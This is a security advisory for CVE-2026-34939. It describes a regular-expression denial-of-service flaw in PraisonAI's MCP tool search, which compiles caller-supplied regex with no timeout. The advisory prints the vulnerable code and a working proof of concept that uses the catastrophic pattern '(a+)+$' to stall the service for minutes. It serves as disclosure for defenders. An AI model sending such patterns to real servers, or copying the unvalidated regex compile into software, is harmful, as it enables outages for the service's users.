# [M] PraisonAI Has ReDoS via Unvalidated User-Controlled Regex in MCPToolIndex.search_tools()

## Summary
Severity: Medium
Advisory: GHSA-8w9j-hc3g-3g7f
CVE: CVE-2026-34939
CWE: CWE-1333
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-8w9j-hc3g-3g7f
Type: github-advisory

## Affected
- PyPI: `praisonai` — affected >=0 <4.5.90

## Details
### Summary

`MCPToolIndex.search_tools()` compiles a caller-supplied string directly as a Python regular expression with no validation, sanitization, or timeout. A crafted regex causes catastrophic backtracking in the `re` engine, blocking the Python thread for hundreds of seconds and causing a complete service outage.

### Details

`tool_index.py:365` (source) -> `tool_index.py:368` (sink)
```python
# source -- query taken directly from caller, no validation
def search_tools(self, query: str) -> List[ToolInfo]:
    import re

# sink -- compiled and applied with no timeout or exception handling
    pattern = re.compile(query, re.IGNORECASE)
    for tool in self.get_all_tools():
        if pattern.search(tool.name) or pattern.search(tool.hint):
            matches.append(tool)
```

### PoC
```python
# tested on: praisonai==1.5.87 (source install)
# install: pip install -e src/praisonai
import sys, time, json
sys.path.insert(0, 'src/praisonai')
from pathlib import Path

mcp_dir = Path.home() / '.praison' / 'mcp' / 'servers' / 'test_server'
mcp_dir.mkdir(parents=True, exist_ok=True)
(mcp_dir / '_index.json').write_text(json.dumps([
    {"name": "a" * 30 + "!", "hint": "a" * 30 + "!", "server": "test_server"}
]))
(mcp_dir / '_status.json').write_text(json.dumps({
    "server": "test_server", "available": True, "auth_required": False,
    "last_sync": time.time(), "tool_count": 1, "error": None
}))

from praisonai.mcp_server.tool_index import MCPToolIndex
index = MCPToolIndex()

start = time.monotonic()
results = index.search_tools("(a+)+$")
print(f"Returned in {time.monotonic() - start:.1f}s")
# expected output: Returned in 376.0s
```

### Impact

A single crafted query blocks the Python thread for hundreds of seconds, causing a complete service outage for the duration. The MCP server HTTP transport runs without an API key by default, making this reachable by any attacker on the network. Repeated requests sustain the DoS indefinitely.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-8w9j-hc3g-3g7f
- https://nvd.nist.gov/vuln/detail/CVE-2026-34939
- https://github.com/MervinPraison/PraisonAI
